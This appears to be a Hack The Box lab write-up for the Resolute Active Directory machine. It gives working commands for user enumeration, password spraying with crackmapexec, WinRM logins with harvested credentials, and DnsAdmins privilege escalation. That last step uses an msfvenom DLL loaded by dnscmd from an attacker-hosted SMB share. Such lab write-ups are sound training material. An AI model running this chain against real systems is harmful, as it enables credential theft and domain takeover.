---
title: "Writeup: Resolute from Hack The Box"
author: Asier Núñez
pubDatetime: 2025-01-10T08:06:18.699Z
slug: resolute-writeup
featured: false
draft: false
tags:
  - Windows
  - Active Directory
  - Security
  - Ethical Hacking
  - LDAP
  - WinRM
  - DNS
description: "Writeup for the Resolute machine from Hack The Box, a Windows Active Directory."
---

# Enumeration

Domain: MEGABANK.LOCAL
CN: Resolute

After trying to enumerate with anonymous and guest users via SMB and not getting any results, we can try to use `windapsearch` to enumerate users.

```bash
./windapsearch-linux-amd64 -d resolute.megabank.local --dc 10.129.139.173 -m users --full
```

This will give us a list of users and their attributes. If we then look at the description of the users, we can see that one of them has a default password.

```bash
./windapsearch-linux-amd64 -d resolute.megabank.local --dc 10.129.139.173 -m users --full | grep Password
```

![Default-Password](@assets/images/writeups/htb/resolute/default-pass.png)

We can create a list of users with the following command:

```bash
./windapsearch-linux-amd64 -d resolute.megabank.local --dc 10.129.139.173 -m users | grep sAM | awk '{print $2}' > users
```

And run `crackmapexec` to spray the password over the users.

```bash
crackmapexec smb 10.129.139.173 -u users -p 'Welcome123!'
```

![Pass-Spray](@assets/images/writeups/htb/resolute/pass-spray.png)

```
melanie:Welcome123!
```

With these credentials, we can access the machine via WinRM.

```bash
evil-winrm -u melanie -p 'Welcome123!' -i 10.129.139.173
```

![melanie-winrm](@assets/images/writeups/htb/resolute/melanie-winrm.png)

Once we are in the machine, we can find a hidden directory at `C:\\PSTanscripts` what the PowerShell history.

```
ryan:Serv3r4Admin4cc123!
```

If we test these credentials, we can see that we can access the machine as `ryan`.

```bash
crackmapexec smb 10.129.139.173 -u users -p 'Serv3r4Admin4cc123!' --continue-on-success
```

![Ryan-Spray](@assets/images/writeups/htb/resolute/ryan-spray.png)

Now we can use `evil-winrm` to access the machine as `ryan`.

```bash
evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.129.139.173
```

![ryan-winrm](@assets/images/writeups/htb/resolute/ryan-winrm.png)

# Privilege Escalation

As `ryan` is part of the `DnsAdmins` group, we can use `dnscmd` to escalate privileges.
We need to take into account the information obtained from the note found in ryan's desktop.

![Note](@assets/images/writeups/htb/resolute/note.png)

So with this information, we can create a DLL with `msfvenom` that changes the password of the `administrator` user.

```bash
msfvenom -p windows/x64/exec cmd='net user administrator Welcome123! /domain' -f dll > da.dll
```

```bash
impacket-smbserver -smb2support Share $(pwd)
```

After that, we can use `dnscmd` to set the server level plugin.

```cmd
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.79\Share\da.dll
```

Now we can restart the DNS service.

```cmd
sc.exe stop dns
```

```cmd
sc.exe start dns
```

![pe](@assets/images/writeups/htb/resolute/pe.png)

```cmd
sudo impacket-psexec megabank.local/administrator@10.129.139.173
```

![Pwned](@assets/images/writeups/htb/resolute/pwned.png)
